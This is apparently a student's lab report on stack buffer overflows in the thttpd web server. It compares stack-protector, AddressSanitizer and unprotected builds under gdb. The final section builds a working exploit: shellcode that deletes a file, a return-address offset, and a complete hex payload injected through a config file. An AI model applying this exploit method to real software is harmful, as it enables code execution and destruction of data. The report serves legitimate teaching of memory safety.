CS33 SMASHING LAB



1.) Here, I entered "export PATH=/usr/local/cs/bin:$PATH" to set the PATH on the command line
interface. By doing so, the correct gcc will be used for the lab (in which entering "which gcc"
will output "/usr/local/cs/bin/gcc").










2.) I first applied the given patches in the instructions by replacing the stated lines
-    char line[10000];
+    char line[100];

-    while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
+    while ( fgets( line, 1000, fp ) != (char*) 0 )

in thttpd.c, and

-	(void) strcpy( str, &str[7] );
+	(void) memmove( str, &str[7], strlen (&str[7]) + 1 );

in libhttpd.c.

Then, I configured the program by entering

./configure \
LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

creating some files like config.h and Makefile (in www).

Finally, I compiled the program thttpd.c three times in the following ways

make clean
CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd src/thttpd-sp

make clean
CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
mv src/thttpd src/thttpd-as

make clean
CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd src/thttpd-no

resulting in three executables, thttpd-sp.o, thttpd-as.o, and thttpd-no.o.










3.) I calculated the port numbers to be used in the lab using the formula
"(12330 + 3 * (X % 293) + Y)", resulting in 12949, 12950, and 12951 for
thttpd-sp.o, thttpd-as.o, and thttpd-no.o, respectively.










4.) To test if the web servers work in the normal case, I ran

src/thttpd-sp -p 12949 -D, src/thttpd-as -p 12950 -D, or src/thttpd-sp -p 12951 -D

in the directory for sthttpd-2.27.0, then ran

curl http://localhost:12949/foo.txt, curl http://localhost:12950/foo.txt, and
curl http://localhost:12951/foo.txt

for each case in a separate terminal in the same directory, respectively. Doing so would see if
the file foo.txt in the src directory ca be accessed, which would display

<HTML>
<HEAD><TITLE>403 Forbidden</TITLE></HEAD>
<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
<H2>403 Forbidden</H2>
The requested URL '/foo.txt' resolves to a file that is not world-readable.
<HR>
<ADDRESS><A HREF="http://localhost">thttpd</A></ADDRESS>
</BODY>
</HTML>

regardless of what text is in the file for each case. If it fails, then it would display

curl: (7) Failed connect to localhost:12949; Connection refused

This can also be checked with the command

ps aux | grep dennisz

resulting in an output of all the processes. For instance, for thttpd-sp,

root     26967  0.0  0.0 149868  5312 ?        Ss   19:29   0:00 sshd: dennisz [priv]
dennisz  26973  0.0  0.0 152116  3292 ?        S    19:29   0:00 sshd: dennisz@pts/5
dennisz  26975  0.0  0.0 120988  3576 pts/5    Ss   19:29   0:00 -bash
root     27098  0.0  0.0 149868  5304 ?        Ss   19:29   0:00 sshd: dennisz [priv]
dennisz  27102  0.0  0.0 152116  3288 ?        S    19:29   0:00 sshd: dennisz@pts/54
dennisz  27104  0.0  0.0 120988  3580 pts/54   Ss   19:29   0:00 -bash
dennisz  27428  0.0  0.0  15592  1572 pts/5    S+   19:32   0:00 src/thttpd-sp -p 12949 -D
dennisz  27442  0.0  0.0 155300  1996 pts/54   R+   19:33   0:00 ps aux
dennisz  27443  0.0  0.0 112648   964 pts/54   S+   19:33   0:00 grep --color=auto dennisz

In this case, the third last column would show that the case is working.
To end the process, ctrl-c is entered in the hanging terminal to kill the process.










5.) Here, I first made a text file configuration.txt with the text

nochroot nochroot nochroot nochroot...

which continues 39 times for a total of 350 characters, including whitespaces, all on
the same line (to have an error, more than 100 characters is needed to overflow line[100]).
Then I ran thttpd-sp.o on gdb, using the commands

gdb src/thttpd-sp
run -p 12949 -D -C configuration.txt

resulting in the error message stating that stack smashing has occured

*** stack smashing detected ***: /w/home.14/cs/ugrad/dennisz/CS33SMASHINGLAB/sthttpd-2.27.0/src/
thttpd-sp terminated

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1

From here, I backtraced with "bt", ending up with

#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405056 in read_config (filename=<optimized out>)
    at thttpd.c:1190
#7  0x6f6f7268636f6e00 in ?? ()
#8  0x6f7268636f6e0074 in ?? ()
#9  0x7268636f6e00746f in ?? ()
#10 0x68636f6e00746f6f in ?? ()
#11 0x636f6e00746f6f72 in ?? ()
#12 0x6f6e00746f6f7268 in ?? ()
#13 0x6e00746f6f726863 in ?? ()
#14 0x00746f6f7268636f in ?? ()
#15 0x746f6f7268636f6e in ?? ()
#16 0x6f6f7268636f6e00 in ?? ()
#17 0x6f7268636f6e0074 in ?? ()
#18 0x7268636f6e00746f in ?? ()
#19 0x68636f6e00746f6f in ?? ()
#20 0x636f6e00746f6f72 in ?? ()
#21 0x6f6e00746f6f7268 in ?? ()

This indicates that the stack has indeed been overwritten. The return address is overwritten with
the ASCII encoding of "nochroot" (which is 6e6f6368726f6f74), then calls of "functions" at undefined
memory locations take place.
After backtracing, I then set a breakpoint at line 1190 of hthhpd.c and set to display the next
machine command respectively using

b 1190
set disassemble-next-line on

Finally, I ran the program all over again and performed one step using

run -p 12949 -D -C configuration.txt

resulting in 

Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
1190        }
=> 0x0000000000404f23 <read_config+1219>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
   0x0000000000404f28 <read_config+1224>:       64 48 33 04 25 28 00 00 00     xor    %fs:0x28,%rax
   0x0000000000404f31 <read_config+1233>:       0f 85 1a 01 00 00       jne    0x405051 <read_config+1521>
   0x0000000000404f37 <read_config+1239>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404f3b <read_config+1243>:       5b      pop    %rbx
   0x0000000000404f3c <read_config+1244>:       5d      pop    %rbp
   0x0000000000404f3d <read_config+1245>:       41 5c   pop    %r12
   0x0000000000404f3f <read_config+1247>:       41 5d   pop    %r13
   0x0000000000404f41 <read_config+1249>:       41 5e   pop    %r14
   0x0000000000404f43 <read_config+1251>:       c3      retq

COnsidering that "fstack-protector-strong" is implemented using a canary bit to check for overwrites,
the second and third lines of the output reflect this, performing a comparison to "itself" and a
"jump if not equal to", which later leads to calling the function __stack_chk_fail ().










6.) Here, I did the same thing as thttpd-sp (and used the same configuration.txt, running

gdb src/thttpd-as
run -p 12950 -D -C configuration.txt

leading to the error message

==49087==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffce64 at pc 0x00000043aec9 bp 0x7fffffffcdc0 sp 0x7fffffffc570
READ of size 351 at 0x7fffffffce64 thread T0

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1

Backtracing the program would lead to

#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffbce0, pc=4435657, max_depth=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
#3  0x00000000004b42e1 in GetStackTraceWithPcBpAndContext (fast=false,
    context=0x0, bp=140737488342464, pc=4435657, max_depth=256,
    stack=0x7fffffffbce0)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
#4  __asan::ReportGenericError (pc=<optimized out>,
    bp=bp@entry=140737488342464, sp=sp@entry=140737488340336,
    addr=addr@entry=140737488342628, is_write=is_write@entry=false,
    access_size=access_size@entry=351, exp=<optimized out>,
    fatal=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>,
    c=<optimized out>)
    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
    at thttpd.c:1018
#7  0x746f6f7268636f6e in ?? ()
#8  0x6f6f7268636f6e20 in ?? ()

The backtrace indicates the same error as #5: the return address was overwritten with
"6e6f6368726f6f74", except that here, the last line executed is line 1018. So, I set a breakpoint
at this spot with

b 1018
set disassemble-next-line on

Executing the program again with "run -p 12950 -D -C configuration.txt" results in

Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1018
1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
=> 0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
   0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
   0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>
   0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
   0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>

Here, the function "__interceptor_strchr(char const*, int)" is called, which checks for overflows
and later results in an error output (as shown in the backtrace above).










7.) Here, we again run the program on gdb with the same text file input

run src/thttpd-no
run -p 12951 -D -C configuration.txt

leading to the error message

Program received signal SIGSEGV, Segmentation fault.
0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
1190

Backtracing (with bt) would result in

#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
#1  0x6f6f7268636f6e00 in ?? ()
#2  0x6f7268636f6e0074 in ?? ()
#3  0x7268636f6e00746f in ?? ()
#4  0x68636f6e00746f6f in ?? ()
#5  0x636f6e00746f6f72 in ?? ()
#6  0x6f6e00746f6f7268 in ?? ()
#7  0x6e00746f6f726863 in ?? ()
#8  0x00746f6f7268636f in ?? ()
#9  0x746f6f7268636f6e in ?? ()
#10 0x6f6f7268636f6e00 in ?? ()
#11 0x6f7268636f6e0074 in ?? ()
#12 0x7268636f6e00746f in ?? ()
#13 0x68636f6e00746f6f in ?? ()
#14 0x636f6e00746f6f72 in ?? ()
#15 0x6f6e00746f6f7268 in ?? ()
#16 0x6e00746f6f726863 in ?? ()
#17 0x00746f6f7268636f in ?? ()
#18 0x746f6f7268636f6e in ?? ()
#19 0x6f6f7268636f6e00 in ?? ()
#20 0x6f7268636f6e0074 in ?? ()
#21 0x7268636f6e00746f in ?? ()
#22 0x68636f6e00746f6f in ?? ()

Here, there is no mechanism to detect stack smashing. Like the other cases, the function would
still end up overwriting its return address, leading to the segmentation fault.

I then Set up to look at the last machine code executed that causes this error using

b 1190
set disassemble-next-line on

which reults in

=> 0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
   0x0000000000404d9f <read_config+1215>:       c3      retq

As mentioned before, there are no checks in the assembly code.










8.) To generate the assembly code, I entered

make clean
CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
mv src/thttpd.o src/thttpd-sp.s

make clean
CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
mv src/thttpd.o src/thttpd-as.s

make clean
CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
mv src/thttpd.o src/thttpd-no.s

creating thttpd-sp.s, thttpd-as.s, thttpd-no.s, respectively.

An important thing to note is that the function handle_read in both thttpd-sp.s and thttpd-no.s
are identical, except for a few addresses here and there. "fstack-protector-strong" doesn't seem
to protect every function, providing checks for overwrites like it did for read_config.

In thttpd-as.s, handle_read does a lot more bound checking (as "fsanitize=address" is specifically
meant for indicating buffer-overflow). Here, the function does a lot of bounds checking, as shown by
the lengthy sequence to test's and cmp's, resulting in handle_read for thttpd-as nbeing significantly
longer that the -sp and -no counterparts.





9.) First, we begin by writing a program using unlink to delete a file names "target.txt"

#include<unistd.h>
main() {
const char file[] = "target.txt";
remove(file);
}

, compiled it with

gcc -c unlink.c

, and ran it with

gcc unlink.o
./a.out

to make sure it works in its base case (deleting "target.txt" in its own directory).
Then, I used

gcc -S unlink.c (for more information)
objdump -d unlink.o

for the following outputs.

	.file	"unlink.c"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movabsq	$8371756736204398964, %rax
	movq	%rax, -16(%rbp)
	movw	$29816, -8(%rbp)
	movb	$0, -6(%rbp)
	leaq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	unlink
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (GNU) 6.3.0"
	.section	.note.GNU-stack,"",@progbits

0000000000000000 <main>:
   0:   55                      push   %rbp
   1:   48 89 e5                mov    %rsp,%rbp
   4:   48 83 ec 10             sub    $0x10,%rsp
   8:   48 b8 74 61 72 67 65    movabs $0x742e746567726174,%rax
   f:   74 2e 74
  12:   48 89 45 f0             mov    %rax,-0x10(%rbp)
  16:   66 c7 45 f8 78 74       movw   $0x7478,-0x8(%rbp)
  1c:   c6 45 fa 00             movb   $0x0,-0x6(%rbp)
  20:   48 8d 45 f0             lea    -0x10(%rbp),%rax
  24:   48 89 c7                mov    %rax,%rdi
  27:   e8 00 00 00 00          callq  2c <main+0x2c>
  2c:   b8 00 00 00 00          mov    $0x0,%eax
  31:   c9                      leaveq
  32:   c3                      retq

Here, we have the bytecode to convert into ASCII format for the exploit.
Next, we would calculate the offset of the return address with respect to the beginning of "char line[]" on the stack, using

gdb src/thttpd-no
break read_config
run -p 12951 -D

Entering in "print &line" would result in

$1 = (char (*)[100]) 0x7fffffffcf50

and "i r rsp" would result in

rsp            0x7fffffffcfe8   0x7fffffffcfe8

Here, the offset between the beginning of rbp and &line is 0x7fffffffcfe8 - 0x7fffffffcf50 = 152 bytes.
Since the return address is pushed right before the function is called, the offset between the return address and &line is 160 bytes.
Now, we begin writing the exploit in hexadecimals.
We want our code to be in the following format:
"port=""exploit code in ASCII format""random values until the length hits 152""8 byte return address"
(note that the machine is little endian, and with respect to this diagram, would read addresses from right to left.)

Port, in hexadecimal, would translate to

70 6f 72 74 3d 00 00 00
(note that having the exploit start at an even address would be more efficient for reading [probably not necessary])

Now, for the actual exploit code (segment), we would have

55 48 89 e5 48 83 ec 10 48 b8 74 61 72 67 65 74 2e 74 48 89 45 f0 66 c7 45 f8 78 74 c6 45 fa 00 48 8d 45 f0 48 89 c7 e8 00 00 00 00 b8 00 00 00 00 c9 c3

In order to overwrite the return address, we must overflow the buffer enough to reach the return address.
In order to do this,we calculate that we need 160-8-51-8=93 bytes to add.
In this case, we would simply insert 93 "00"'s.

As for the address, we would insert "the address of the first exploit instruction", or 7fffffffcf58 (&line + 8).
Since the machine is little endian, we oud rewrite this as "58 cf ff ff ff 7f 00 00".

So, we would end up with the following exploit in hexadecimal

70 6f 72 74 3d 00 00 00 55 48 89 e5 48 83 ec 10 48 b8 74 61 72 67 65 74 2e 74 48 89 45 f0 66 c7 45 f8 78 74 c6 45 fa 00 48 8d 45 f0 48 89 c7 e8 00 00 00 00 b8 00 00 00 00 c9 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 58 cf ff ff ff 7f 00 00

Then, we would translate this into ASCII format (along with this report), and save it as a text file "exploit.txt".

Finally, on gdb, we run

gdb src/thttpd-no
run -p 12951 -D -C exploit.txt

to delete the file.
(Note that one can test this is correct by entering

gdb src/thttpd-no
b 1190 (the end ot read_config)
set disassemble-next-line on
run -p 12951 -D -C exploit.txt

and "si" a couple of time [more than 5 times] to make sure that the correct address is accessed and the instructions match).

(note that this exploit only works on gdb because ASLR is turned off by default)